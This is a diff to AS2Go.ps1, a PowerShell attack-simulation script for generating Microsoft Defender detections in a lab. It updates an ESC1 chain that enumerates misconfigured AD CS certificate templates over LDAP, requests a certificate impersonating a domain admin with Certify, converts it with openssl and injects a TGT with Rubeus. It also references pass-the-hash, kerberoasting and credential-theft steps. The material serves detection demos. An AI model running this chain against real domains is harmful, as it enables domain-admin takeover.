@@ -21,13 +21,12 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 
 .NOTES
 
-last update: 2023-04-24
-File Name  : AS2Go.ps1 | Version 2.8.x
+last update: 2023-09-09
+File Name  : AS2Go.ps1 | Version 2.9.x
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
 
 .EXAMPLE
-
 PS> cd C:\temp\AS2GO
 PS> .\AS2Go.ps1
 
@@ -36,8 +35,8 @@ PS> .\AS2Go.ps1
 Purpose: Run the script with user interactions
 
 .EXAMPLE
-PS> .\AS2Go.ps1 -Contine
-Purpose: Contine the use case or does not start the use case from the beginning
+PS> .\AS2Go.ps1 -Continue
+Purpose: Continue the use case or does not start the use case from the beginning
 
 .EXAMPLE
 PS> .\AS2Go.ps1 -SkipImages
@@ -84,7 +83,11 @@ PS> .\AS2Go.ps1 -EnableLogging
 Purpose: Enable the logging function. By default, the log file is .\AS2Go.ps1.log
 
 .EXAMPLE
-PS> .\AS2Go.ps1 -EnableLogging -Contine -SkipImages -SkipPasswordSpray -SkipReconnaissance -SkipCompromisedAccount
+PS> .\AS2Go.ps1 -EnableLogging -Continue -SkipImages -SkipPasswordSpray -SkipReconnaissance -SkipCompromisedAccount
+Purpose: Of course, a combination of multiple switches is also possible. This commands starts direct the Priviledge Escalation.
+
+.EXAMPLE
+PS> .\AS2Go.ps1 -Continue -EnableLogging -SkipImages -SkipPasswordSpray -SkipCompromisedAccount -SkipReconnaissance -SkipSensitiveDataAccess -SkipPopup
 Purpose: Of course, a combination of multiple switches is also possible. This commands starts direct the Priviledge Escalation.
 
 
@@ -96,6 +99,8 @@ https://www.ired.team/offensive-security-experiments/active-directory-kerberos-a
 https://learn.microsoft.com/en-us/defender-for-identity/playbook-reconnaissance
 https://github.com/GhostPack/Certify
 https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group
+https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate
+https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates
 
 
 
@@ -110,6 +115,7 @@ Param (
     [switch]$Continue,
     [Switch]$EnableLogging,
     [switch]$SkipImages,
+    [switch]$SkipPopup,
     [switch]$SkipPasswordSpray,
     [switch]$SkipCompromisedAccount,
     [switch]$SkipPwSpayWithRubeus,
@@ -131,15 +137,21 @@ Param (
 ######                                                                     #####
 ################################################################################
 
-$lastupdate = "2023-04-24"
-$version = "2.8.0"
-
+$lastupdate = "2023-09-10"
+$version = "2.9.6"
+# 2022-09-10 | v2.9.0 |  Upload to Github
+# 2023-09-09 | v2.8.6 |  minor updates
+# 2023-08-29 | v2.8.5 |  Update Function Get-KerberosTGT
+# 2023-08-27 | v2.8.4 |  Update Function New-PrivilegeEscalationRecommendation
+# 2023-08-26 | v2.8.3 |  Update Function Get-VulnerableCertificateTemplate (replace Certify by LDAP Query)
+# 2023-08-26 | v2.8.2 |  Replace Function Get-EnterpriseCAName by Get-EnrollmentService (replace Certify by LDAP Query)
+# 2023-08-25 | v2.8.1 |  Add Switches -SkipPopup
 # 2022-04-24 | v2.8.0 |  Upload to Github
 # 2023-04-24 | v2.7.9 |  Update Help / Examples
 # 2023-04-23 | v2.7.8 |  Update Functions Get-KerberosTGT & Start-ConvertingToPfxFromPem - due to double file names in console
 # 2023-04-23 | v2.7.7 |  Update Function Start-RequestingCertificate - file da-xxxxx.pem file be filled automatically now
 # 2023-04-11 | v2.7.6 |  Update Function New-Backdoor User due to Get-ADPrincipalGroupMembership does not work on Windows 11
-# 2023-04-11 | v2.7.5 |  Update Function New-Recommendation
+# 2023-04-11 | v2.7.5 |  Update Function New-PrivilegeEscalationRecommendation
 # 2023-04-11 | v2.7.4 |  Add Function Get-AdminWithSPN
 # 2023-04-10 | v2.7.3 |  Add Function New-PrivilegesEscalationtoSystem
 # 2023-04-10 | v2.7.2 |  Add Function Get-CachedKerberosTicketsClient
@@ -149,10 +161,10 @@ $version = "2.8.0"
 # 2023-03-30 | v2.6.8 |  Update Privilege Escalations Section
 # 2023-03-28 | v2.6.7 |  Add Function New-KeyValue
 # 2023-03-28 | v2.6.6 |  Update Functions Add-KeyValue & Set-Keyvalue and update as2go.xml file (schema)
-# 2023-03-28 | v2.6.5 |  Add Function New-Recommendation 
+# 2023-03-28 | v2.6.5 |  Add Function New-PrivilegeEscalationRecommendation 
 # 2023-03-26 | v2.6.4 |  Add Function Disable-As2GoUser
 # 2023-03-25 | v2.6.3 |  Update Function Reset-As2GoPassword
-# 2023-03-19 | v2.6.2 |  Add Switches like -UnAttended -EnableLogging -Contine -SkipImages -SkipPasswordSpray -SkipReconnaissance -SkipCompromisedAccount
+# 2023-03-19 | v2.6.2 |  Add Switches like -UnAttended -EnableLogging -Continue -SkipImages -SkipPasswordSpray -SkipReconnaissance -SkipCompromisedAccount
 # 2022-12-01 | v2.6.0 |  Upload to Github
 # 2022-11-27 | v2.5.9 |  Add Functions Get-ComputerInformation & AS2Go
 # 2022-11-24 | v2.5.8 |  Add Function Get-ADGroupNameBasedOnRID
@@ -184,6 +196,11 @@ $version = "2.8.0"
 
 [bool]$showStep = $true # show the steps in an image
 [bool]$skipstep = $false # show the steps in an image
+
+$PublishedRiskyTemplates = New-Object System.Collections.ArrayList
+
+
+
 
 
 $path = Get-Location
@@ -228,11 +245,13 @@ $global:BDUser = ""
 $global:BDCred = ""
 
 
-$fgcS = "Gray"    # Switch - DarkGray
+$fgcS = "DarkGray"    # Switch - DarkGray
 $fgcC = "Yellow"  # Command
 $fgcV = "Cyan"    # Value
 $fgcF = "White"
 $fgcH = "Yellow" 
+$fgcR = "Green"   #result
+$fgcG = "Gray"
 
 $WinVersion = [System.Environment]::OSVersion.Version.ToString()
 
@@ -1051,7 +1070,7 @@ function Get-KerberosTGT {
 
     ################################################################################
     #####                                                                      ##### 
-    #####                          Get-KerberosTGT                             #####
+    #####  Request a ticket-granting ticket (TGT) by using the pfx certificate #####                             #####
     #####                                                                      #####
     ################################################################################
 
@@ -1072,23 +1091,19 @@ function Get-KerberosTGT {
     pause
     Clear-Host
     Write-Host "____________________________________________________________________`n" 
-    Write-Host "                    Get-KerberosTGT            "
+    Write-Host " Request a ticket-granting ticket (TGT) by using the pfx certificate"
     Write-Host "____________________________________________________________________`n" 
     #regionword = Read-Host "Enter password for pfx file - $pfxFile"
-    
-    
+        
     If ($pfxFile.Contains("\")) {
         $temp = $pfxFile.Split(" ")
         $pfxFile = $temp[-1]
     }
- 
-  
+       
+    $request = ".\Rubeus.exe asktgt /user:$altname /certificate:.\$pfxFile /ptt"
     
-    $request = ".\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt"
-    
-
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\Rubeus.exe ", "asktgt /user:", "$altname", " /certificate:", "$pfxFile", " /ppt"  `
+    Write-Highlight -Text ".\Rubeus.exe ", "asktgt /user:", "$altname", " /certificate:", ".\$pfxFile", " /ppt"  `
         -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
     Write-Host ""
     Write-Log -Message $request
@@ -1096,7 +1111,7 @@ function Get-KerberosTGT {
     pause
     #Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt} | Out-Host
     #Invoke-Command -ScriptBlock { .\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt } | Out-Host
-    .\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt | Out-Host
+    .\Rubeus.exe asktgt /user:$altname /certificate:.\$pfxFile /ptt | Out-Host
 
     pause
 
@@ -1108,9 +1123,6 @@ function Get-KerberosTGT {
     Get-DirContent -Path $directory
     pause
     Clear-Host
-
-
-
 
     klist
     pause
@@ -1272,6 +1284,8 @@ function Get-RiskyEnrolledTemplates {
 
 
 
+#    write-host =    "(&(objectClass=pKICertificateTemplate)(cn=$PublishedTemplate)(msPKI-Certificate-Name-Flag=1)(msPKI-Certificate-Application-Policy=1.3.6.1.5.5.7.3.2))"
+#    Write-host = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$forest"
     try{
 
         $temp = Get-ADForest | Select-Object Name
@@ -1293,6 +1307,7 @@ function Get-RiskyEnrolledTemplates {
         }
     }
 
+    #$PublishedRiskyTemplates = ""
 
     if ($PublishedPKITemplates) {
         # For each template name searc for the object
@@ -1301,11 +1316,26 @@ function Get-RiskyEnrolledTemplates {
             $RiskyTemplate = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$forest" -LDAPFilter $SearchFilter -SearchScope OneLevel
             if ($RiskyTemplate) {
                 [VOID]$PublishedRiskyDN.Add($RiskyTemplate)
+
+                if ($SuppressOutPut -eq $true) {
+                    $items = @{
+                        Name           = $RiskyTemplate.Name
+                        DN             = $RiskyTemplate.DistinguishedName
+                        ObjectGUID     = $RiskyTemplate.ObjectGUID
+                        objectClass    = $RiskyTemplate.ObjectClass
+                        CanPublishedBy = "n/a"
+                    }
+                    
+                    $PublishedRiskyTemplates.add((New-Object psobject -Property $items)) | Out-Null
+                }
+
+
+
             }
         }
     }
 
-
+#WIP - Start here
     if ($SuppressOutPut -ne $true) {
         Write-Host "Found $($PublishedRiskyDN.count) risky AND enrolled CA templates:" -ForegroundColor Yellow
         $PublishedRiskyDN | Format-Table Name, ObjectGUID, DistinguishedName | Out-Host
@@ -1323,6 +1353,107 @@ function Get-RiskyEnrolledTemplates {
 }
 
 function Get-VulnerableCertificateTemplate {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####           Finding an Vulnerable Certificate Templates                #####
+    #####                                                                      #####
+    ################################################################################
+
+    Param([string] $myEntCA)
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ####################### main code #########################
+    $CAtemplate = Get-KeyValue -key "BadCA"
+    Write-Host  "  Only a simple LDAP Query is needed:`n"
+
+    Write-Highlight -Text ('     $SearchFilter ', '= ', ' "(&(objectClass=pKICertificateTemplate)(cn=', '$PublishedTemplate', ')(msPKI-Certificate-Name-Flag=1)(msPKI-Certificate-Application-Policy=1.3.6.1.5.5.7.3.2))"')`
+        -Color $fgcR, $fgcF, $fgcV, $fgcR, $fgcV, $fgcF
+
+    Write-Highlight -Text ('     $Template     ', '= ', ' Get-ADObject ', '-SearchBase ', '"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,', '$forest" ', '-LDAPFilter ', '$SearchFilter ', '-SearchScope ', 'OneLevel')`
+        -Color $fgcR, $fgcF, $fgcC, $fgcS, $fgcV, $fgcR, $fgcS, $fgcR, $fgcS, $fgcF
+    
+    Write-Host ""
+    Write-log -Message "     Only a simple LDAP Query is needed."
+    
+    $question = "Do you want to run this step - Y or N? Default "
+    $answer = Get-Answer -question $question -defaultValue $yes
+
+    If ($answer -eq $yes) {
+        #find vulnerable CA templates
+
+        Foreach ($result in $PublishedRiskyTemplates) {
+
+            Write-host "`n`nFound vulnerable template " -NoNewline
+            Write-host "$($result.Name)" -ForegroundColor Yellow -NoNewline
+            Write-host ", which can be enrolled by:`n"
+
+            $DSobject = [adsi]("LDAP://$($result.DN)")
+            $secd = $DSobject.psbase.get_objectSecurity().getAccessRules($true, $chkInheritedPerm.checked, [System.Security.Principal.NTAccount])
+            $results = $secd | Where-Object { $_.AccessControlType -eq "Allow" -and $_.ObjectType -eq "0e10c968-78fb-11d2-90d4-00c04f79dc55" -and $_.ActiveDirectoryRights -like "*ExtendedRight*" } | Select-Object IdentityReference
+
+            foreach ($result2 in $results.IdentityReference) {
+                [string]$t = $result2
+
+                If ($t.Contains("Domain Users") -or $t.Contains("Everyone") -or $t.Contains("Authenticated Users")) {
+                    write-host ("   - $t").PadRight(45, [Char]32) -ForegroundColor Yellow -NoNewline
+                    Write-Host "<< Bingo!"
+                    $CAtemplate = $result.Name
+
+                }
+                elseif ($t.Contains("Domain Computers") ) {
+                    write-host ("   - $t").PadRight(45, [Char]32) -ForegroundColor Yellow -NoNewline
+                    Write-Host "<< Bingo!"
+                    [string]$temp = ($temp + ' - ' + $($result.Name).ToUpper())
+                }
+                else {
+                    write-host "   - $t"
+                }
+            }
+        }
+    }
+
+
+    Do {
+        $question = "Do you want to use CA template '$CAtemplate' - Y or N? Default "
+        $prompt = Get-Answer -question $question -defaultValue $yes
+
+        if ($prompt -ne $yes) {
+            write-host ""
+            [int]$i = 0
+            Foreach ($ca in $PublishedRiskyTemplates) {
+                Write-host "   [" -NoNewline
+                Write-Host $i -ForegroundColor Yellow -NoNewline
+                Write-host "] - $($ca.name)"
+                $i++
+            }
+write-host ""
+            $i = Get-Random -Minimum 0 -Maximum $i
+            $i = Read-Host "Type in the NUMBER for your preferred CA Template, e.g. $i"
+            $CAtemplate = $PublishedRiskyTemplates.name[$i]
+            Set-KeyValue -key "BadCA" -NewValue $CAtemplate
+            write-host ""
+        }
+    } Until ($prompt -eq $yes)
+    
+    #check if this Template can be enrolled by Domain Computers
+    If ($temp.Contains("- $CAtemplate".ToUpper())){
+        [bool]$UseDomainComputers = $true
+    }
+    else {
+        [bool]$UseDomainComputers = $false
+    }
+
+
+    Write-Log -Message "    >> using $CAtemplate, can be enrolled by Domain Computer - $UseDomainComputers"
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    return $CAtemplate, $UseDomainComputers  
+}
+
+function Get-VulnerableCertificateTemplate_old {
 
     ################################################################################
     #####                                                                      ##### 
@@ -1370,6 +1501,63 @@ function Get-VulnerableCertificateTemplate {
     Write-Log -Message "### End Function $myfunction ###"
 
     return $CAtemplate 
+}
+
+
+function Get-EnrollmentService {
+
+    ################################################################################
+    #####                                                                      ##### 
+    #####    technique used by attackers, which allows them to request         #####
+    #####     a service ticket for any service with a registered SPN.          #####
+    #####                                                                      #####
+    ################################################################################
+
+    $myfunction = Get-FunctionName
+    Write-Log -Message "### Start Function $myfunction ###"
+    #region ####################### main code #########################
+
+    Write-Host  "  LDAP Query: `n"
+
+    Write-Highlight -Text ('     $Searchbase         ', ' =',' "CN=Enrollment Services,CN=Public Key Services,CN=Services,', '$ConfigPartition"')`
+    -Color $fgcR, $fgcF, $fgcV, $fgcR
+
+    Write-Highlight -Text ('     $enrollmentServices ', ' =', ' Get-ADObject ', '-Filter ', '{ObjectClass ','-eq', ' "pKIEnrollmentService"', '} -Properties * -SearchBase ', '$Searchbase ','|')`
+    -Color $fgcR, $fgcF, $fgcC, $fgcS,$fgcC, $fgcS,$fgcV, $fgcS, $fgcR, $fgcF
+   
+    Write-Highlight -Text ('                            Where-Object ', '{', ' -not ','[string]::IsNullOrEmpty(','$_','.caCertificate) } ')`
+    -Color $fgcC, $fgcF, $fgcS,$fgcF,$fgcR,$fgcF
+   
+    Write-Highlight -Text ('                            Select-Object ', 'ObjectClass, Name, DNSHostName, caCertificate')`
+    -Color $fgcC, $fgcF
+    
+    Write-host ""
+
+    $ConfigPartition = (Get-ADforest).PartitionsContainer.replace("CN=Partitions,","")
+    $Searchbase = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigPartition"
+    
+    $enrollmentServices = Get-ADObject -Filter {ObjectClass -eq "pKIEnrollmentService"} -Properties * -SearchBase $Searchbase | 
+                          Where-Object { -not [string]::IsNullOrEmpty($_.caCertificate) } |  
+                          Select-Object objectclass, Name, DNSHostName, caCertificate
+    
+    $enrollmentServices | Out-Host
+    
+    $myEntCA = $enrollmentServices.DNSHostName + "\" + $enrollmentServices.Name
+
+    $question = " -> Enter or confirm the Certification Authority! Default "
+    $answer = Get-Answer -question $question -defaultValue $myEntCA
+    Set-KeyValue -key "EnterpriseCA" -NewValue $answer
+
+    Write-Host "`n`nUsing this Certification Authority for the next steps - " -NoNewline
+    Write-Host "$answer`n`n" -ForegroundColor $fgcH
+    
+    If (-not $UnAttended){pause}
+    Write-Log -Message "    >> Using - $answer"
+
+    #endregion ####################### main code #########################
+    Write-Log -Message "### End Function $myfunction ###"
+
+    return $answer
 }
 
 function Get-EnterpriseCAName {
@@ -1512,17 +1700,21 @@ function New-AuthenticationCertificatesAttack {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
 
+
+
+
     Update-WindowTitle -NewTitle $stage25
     Set-KeyValue -key "LastStage" -NewValue $stage25
     If ($showStep) { Show-Step -step "step_007.html" }
     Do {
         Clear-Host
         Write-Host "____________________________________________________________________`n" 
-        Write-Host "       Attack Level - Steal or Forge Authentication Certificates    "
+        Write-Host "    Attack Level - Exploiting Misconfigured Certificate Template    "
         Write-Host ""
-        Write-Host "    Abuse misconfigured AD CS certificate templates to impersonate  "
-        Write-Host "    admin users and create additional authentication certificates   "
+        Write-Host "  ESC 1 - Abuse misconfigured AD CS certificate templates allowing a  "
+        Write-Host "  domain user can escalate his privileges to that of a domain admin   "
         Write-Host "____________________________________________________________________`n" 
+
 
         # http://attack.mitre.org/techniques/T1649/
 
@@ -1531,7 +1723,7 @@ function New-AuthenticationCertificatesAttack {
         }
         else {
             $question = "Do you want to run this attack - Y or N? Default "
-            $answer = Get-Answer -question $question -defaultValue $No
+            $answer = Get-Answer -question $question -defaultValue $yes
         }
 
 
@@ -1550,17 +1742,19 @@ function New-AuthenticationCertificatesAttack {
             Do {
                 Clear-Host
                 Write-Host "____________________________________________________________________`n" 
-                Write-Host "      Step 1 - Get the Enterprise Certification Authority"
+                Write-Host "      Step 1 - Find Enrollment Certification Authority (CA)        "
                 Write-Host "____________________________________________________________________`n"    
                 #region Step 1 - Get the Enterprise Certification Authority   
 
-                $EnterpriseCA = Get-EnterpriseCAName
+                #$EnterpriseCA = Get-EnterpriseCAName
+
+                $EnterpriseCA = Get-EnrollmentService
 
 
                 Clear-Host
 
                 Write-Host "____________________________________________________________________`n" 
-                Write-Host "        ??? REPEAT | Getting Enterprise CA  ???           "
+                Write-Host "        ??? REPEAT | CA Enrollment Serivce ???           "
                 Write-Host "____________________________________________________________________`n" 
 
                 # End "Do ... Until" Loop?
@@ -1573,12 +1767,18 @@ function New-AuthenticationCertificatesAttack {
 
             Clear-Host
             Write-Host "____________________________________________________________________`n" 
-            Write-Host "      Step 2 - Finding an Vulnerable Certificate Templates "
+            Write-Host "Step 2 - Enumerate Misconfigured and (!) Published Certificate Templates"
             Write-Host "____________________________________________________________________`n"
 
             #region Step 2 - Finding an Vulnerable Certificate Templates
 
-            $CAtemplate = Get-VulnerableCertificateTemplate -myEntCA $EnterpriseCA
+            $CATemplateInfo = Get-VulnerableCertificateTemplate -myEntCA $EnterpriseCA
+
+            $CAtemplate = $CATemplateInfo[0]
+
+            #Write-Output $CATemplateInfo[0]
+            #Write-Host $CATemplateInfo[1]
+            #pause
 
             #endregion Step 2 - Finding an Vulnerable Certificate Templates
 
@@ -1586,10 +1786,10 @@ function New-AuthenticationCertificatesAttack {
             Do {
                 Clear-Host
                 Write-Host "____________________________________________________________________`n" 
-                Write-Host "      Step 3 - Requesting Certificate with Certify                           "
+                Write-Host "      Step 3 - Request Certificate with Certify                           "
                 Write-Host "____________________________________________________________________`n"
 
-                $pemFile = Start-RequestingCertificate -myEntCA $EnterpriseCA -CAtemplate $CAtemplate -altname $domainadmin
+                $pemFile = Start-RequestingCertificate -myEntCA $EnterpriseCA -CAtemplate $CAtemplate -altname $domainadmin -domainComputer $CATemplateInfo[1]
 
                 $question = "Do you need to REPEAT this attack level - Y or N? Default "
                 $repeat = Get-Answer -question $question -defaultValue $no
@@ -1602,10 +1802,13 @@ function New-AuthenticationCertificatesAttack {
             Do {
                 Clear-Host
                 Write-Host "____________________________________________________________________`n" 
-                Write-Host "      Step 4 - Converting to PFX from PEM via OpenSSL                   "
+                Write-Host "   Step 4 - Convert to PFX from PEM Certificate Type via Open SSL                "
                 Write-Host "____________________________________________________________________`n"
 
                 $pfxFile = Start-ConvertingToPfxFromPem -pemFile $pemFile
+
+                $question = "Do you need to REPEAT this attack level - Y or N? Default "
+                $repeat = Get-Answer -question $question -defaultValue $no
 
             } Until ($repeat -eq $no)
 
@@ -1616,7 +1819,7 @@ function New-AuthenticationCertificatesAttack {
             Do {
                 Clear-Host
                 Write-Host "____________________________________________________________________`n" 
-                Write-Host "      Step 5 - Request a Kerberos TGT "
+                Write-Host "  Step 5 - Request a Ticket Granting Ticket (TGT) with PFX Certificate   "
                 Write-Host "               for the user for which we minted the new certificate                  "
                 Write-Host "____________________________________________________________________`n"
 
@@ -1630,6 +1833,9 @@ function New-AuthenticationCertificatesAttack {
 
 
         } ##
+        else {
+            return
+        }
 
 
         Clear-Host
@@ -2268,7 +2474,7 @@ Function New-KeyValue {
 
 }
 
-function New-Recommendation {
+function New-PrivilegeEscalationRecommendation {
 
     ################################################################################
     #####                                                                      ##### 
@@ -2296,7 +2502,7 @@ function New-Recommendation {
     Write-Host "____________________________________________________________________`n" 
 
 
-    Write-Host "                 ... please be patient ... " -ForegroundColor Yellow
+    Write-Host "     ... please be patient, while cheching your environment ... " -ForegroundColor Yellow
 
     $overview = Get-ComputerInformation -computer $computer
     $temp = $overview.Replace("        ", " ")
@@ -2338,12 +2544,22 @@ function New-Recommendation {
     }
 
 
-    try {
-        [bool]$bAdminPC = Test-Path -Path "\\$mySAW\c$\temp" -ErrorAction Stop
+    [bool]$result = Test-Connection -ComputerName $mySAW -Quiet -Count 1 -ErrorAction SilentlyContinue
+
+    If ($result -eq $true) {
+        try {
+            [bool]$bAdminPC = Test-Path -Path "\\$mySAW\c$\temp" -ErrorAction Stop
+        }
+        catch {
+            [bool]$bAdminPC = $false
+        }
+
     }
-    catch {
+    else {
         [bool]$bAdminPC = $false
     }
+
+
 
     [bool]$hdUser = Search-ProcessForAS2GoUsers -user  $helpdeskuser
     [bool]$daUser = Search-ProcessForAS2GoUsers -user  $domainadmin 
@@ -2390,7 +2606,7 @@ function New-Recommendation {
     Write-Host "$space  ═════════╬══════════════════════════════════════════"
     Write-Host "$space   PtH     ║    OK    |    OK*   |    OK*   |    --    Pass-the-Hash Attack"  -ForegroundColor Yellow
     Write-Host "$space   PtT     ║    OK    |    OK    |    OK    |    OK    Pass-the-Ticket Attack"  -ForegroundColor Gray
-    Write-Host "$space   PtC     ║    --    |    OK    |    OK    |    OK    Steal or Forge Authentication Certificates "  -ForegroundColor Yellow
+    Write-Host "$space   PtC     ║    --    |    OK    |    OK    |    OK    Abuse misconfigured Certificate Templates "  -ForegroundColor Yellow
     Write-Host "$space   WDigest ║    OK    |    OK    |    OK    |    --    Credential Theft through Memory Access"  -ForegroundColor Gray
     Write-Host "$space   SPN     ║    OK    |    OK    |    OK    |    OK    Kerberoasting Attack"  -ForegroundColor Yellow
     Write-Host "" 
@@ -2629,6 +2845,8 @@ function New-Recommendation {
     Write-Log -Message "    >> Your Victim PC settings -  $overview - $version"
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
+
+    return "C"
 
 }
 
@@ -3506,7 +3724,11 @@ function Start-ConvertingToPfxFromPem {
     Write-Highlight -Text "openssl ", "pkcs12 ", "-in ", $pemFile, " -keyex -CSP ", """Microsoft Enhanced Cryptographic Provider v1.0""", " -export -out ", $pfxFile `
         -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
     Write-Host ""
-    pause
+    
+    $question = "Do you want to run this task - Y or N? Default "
+    $answer = Get-Answer -question $question -defaultValue $yes
+
+    If ($answer -ne $yes) {return $PfxFile}
 
     try {
         Write-Output $convert  | Set-Clipboard
@@ -3523,7 +3745,7 @@ function Start-ConvertingToPfxFromPem {
     Write-Host " - Change directory to C:\temp\AS2Go"
     Write-Host " - Paste the command into the OpenSSL Command Prompt"
     Write-Host " - Save the pfx file with " -NoNewline
-    Write-Host "NO " -NoNewline  -ForegroundColor $fgcH; Write-Host "password"
+    Write-Host "NO " -NoNewline  -ForegroundColor $fgcH; Write-Host "export password"
     Write-Host " - Change back to console " -NoNewline; Write-Host $stage25 -ForegroundColor $fgcH
     Write-Host ""
 
@@ -3558,7 +3780,7 @@ function Start-RequestingCertificate {
     ################################################################################
 
 
-    Param([string] $myEntCA, [string] $CAtemplate, [string] $altname)
+    Param([string] $myEntCA, [string] $CAtemplate, [string] $altname, [bool] $domainComputer)
 
     $myfunction = Get-FunctionName
     Write-Log -Message "### Start Function $myfunction ###"
@@ -3573,6 +3795,30 @@ function Start-RequestingCertificate {
         -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV
     Write-Host ""
     Write-Log -Message "     >> .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname"
+
+
+#hiergehtesweiter
+
+    $hostname = $env:COMPUTERNAME
+
+    If ($domainComputer -eq $true) {
+
+        Write-Host "`n`n  Domain Computers " -ForegroundColor Yellow -NoNewline
+        Write-Host "can enroll your selected template - " -NoNewline
+        Write-Host "$CAtemplate" -ForegroundColor Yellow -NoNewline
+        Write-Host "? Do you want to add the parameter - " -NoNewline
+        Write-host "/machine`n" -ForegroundColor Yellow
+
+        Write-Host      -NoNewline "  Command: "
+        Write-Highlight -Text ".\certify.exe ", "request ", "/ca:", $myEntCA, " /template:", $CAtemplate, " /altname:", $altname, " /machine:", $hostname    `
+            -Color $fgcS, $fgcS, $fgcS, $fgcS, $fgcS, $fgcS, $fgcS, $fgcS, $fgcF, $fgcV
+        
+        $question = "Press - Y or N? Default "
+        $answer = Get-Answer -question $question -defaultValue $yes
+
+        IF ($answer = "R") {}
+     }
+
 
     $question = "Do you want to run this step - Y or N? Default "
     $answer = Get-Answer -question $question -defaultValue $yes
@@ -3627,6 +3873,9 @@ function Start-RequestingCertificate {
             Write-Host $result[4]
         }
         pause
+    }
+    else {
+        return $pemFile
     }
  
     write-host "`n  Saved to file:" -ForegroundColor $fgcH
@@ -4176,9 +4425,9 @@ Function Start-AS2GoDemo {
             Write-Log -Message "Running AS2Go in Developer Mode"
             $fqdn = Get-KeyValue -key "fqdn"
             
-            New-Recommendation -computer $env:COMPUTERNAME
-            #New-Recommendation -computer "WIN11"
-            # New-Recommendation -computer "WIN10-1609"
+            New-PrivilegeEscalationRecommendation -computer $env:COMPUTERNAME
+            #New-PrivilegeEscalationRecommendation -computer "WIN11"
+            # New-PrivilegeEscalationRecommendation -computer "WIN10-1609"
             Exit
         }
 
@@ -4321,7 +4570,7 @@ Function Start-AS2GoDemo {
 
 
 
-    If ($UnAttended -eq $false) {
+    If (($UnAttended -ne $true) -and ($SkipPopup -ne $true)) {
         $question = " -> Enter or confirm your account suffix! Default "
         $suffix = Get-Answer -question $question -defaultValue $suffix
     }
@@ -4357,14 +4606,14 @@ Function Start-AS2GoDemo {
             Write-Output $helpdeskuser | clip
         }
         
-        If ($UnAttended -eq $false) {
+        If (($UnAttended -ne $true) -and ($SkipPopup -ne $true)) {
             $wshell = New-Object -ComObject Wscript.Shell
             $Output = $wshell.Popup("Do NOT forget to simulate helpdesk support by ""$helpdeskuser"" on your Victim PC!", 0, "Simulate helpdesk support on Victim PC - hd.cmd", 0 + 64)
         }
 
     }
     else {
-        If ($UnAttended -eq $false) {
+        If (($UnAttended -ne $true) -and ($SkipPopup -ne $true)) {
             $wshell = New-Object -ComObject Wscript.Shell
             $Output = $wshell.Popup("Do NOT forget to simulate domain activities by ""$domainadmin"" on your Admin PC!", 0, "Simulate domain activities on Admin PC", 0 + 64)           
         }
@@ -4375,7 +4624,7 @@ Function Start-AS2GoDemo {
     Set-KeyValue -key "LastVictim" -NewValue $victim
 
 
-    If ($UnAttended) {
+    If (($UnAttended -ne $true) -and ($SkipPopup -ne $true)) {
         Start-Sleep 2
     }
     else {
@@ -4656,18 +4905,18 @@ Function Start-AS2GoDemo {
             # If ($skipstep) { break }     
             Clear-Host
             Set-NewColorSchema -NewStage $InitialStart
-            New-Recommendation -computer $env:COMPUTERNAME
+            $PrivilegeEscalation = New-PrivilegeEscalationRecommendation -computer $env:COMPUTERNAME
 
             Write-Host "____________________________________________________________________`n" 
             Write-Host "       Privilege Escalation - choose your attack                             "
             Write-Host "____________________________________________________________________`n" 
-            Write-Host "     - for a Pass-the-Hash Attack enter:                     " -NoNewline; Write-Host "H"-ForegroundColor Yellow
-            Write-Host "     - for a Pass-the-Ticket Attack enter:                   " -NoNewline; Write-Host "T"-ForegroundColor Yellow
-            Write-Host "     - for a Kerberoasting Attack enter:                     " -NoNewline; Write-Host "K"-ForegroundColor Yellow
-            Write-Host "     - for a Forge Authentication Certificates Attack enter: " -NoNewline; Write-Host "C"-ForegroundColor Yellow
-            Write-Host "     - for a PsExec Attack, eg. to System account enter  :   " -NoNewline; Write-Host "X"-ForegroundColor Yellow
-            Write-Host "     - for a Credential Theft through Memory Access enter:   " -NoNewline; Write-Host "M"-ForegroundColor Yellow
-            Write-Host "     - to enable the Memory Access enter:                    " -NoNewline; Write-Host "E"-ForegroundColor Yellow
+            Write-Host "     - for a Pass-the-Hash Attack enter:                                 " -NoNewline; Write-Host "H"-ForegroundColor Yellow
+            Write-Host "     - for a Pass-the-Ticket Attack enter:                               " -NoNewline; Write-Host "T"-ForegroundColor Yellow
+            Write-Host "     - for a Kerberoasting Attack enter:                                 " -NoNewline; Write-Host "K"-ForegroundColor Yellow
+            Write-Host "     - for a for Misconfigured Certificate Template Attack (ESC1) enter: " -NoNewline; Write-Host "C"-ForegroundColor Yellow
+            Write-Host "     - for a PsExec Attack, eg. to System account enter  :               " -NoNewline; Write-Host "X"-ForegroundColor Yellow
+            Write-Host "     - for a Credential Theft through Memory Access enter:               " -NoNewline; Write-Host "M"-ForegroundColor Yellow
+            Write-Host "     - to enable the Memory Access enter:                                " -NoNewline; Write-Host "E"-ForegroundColor Yellow
 
 
             If ($UnAttended) {
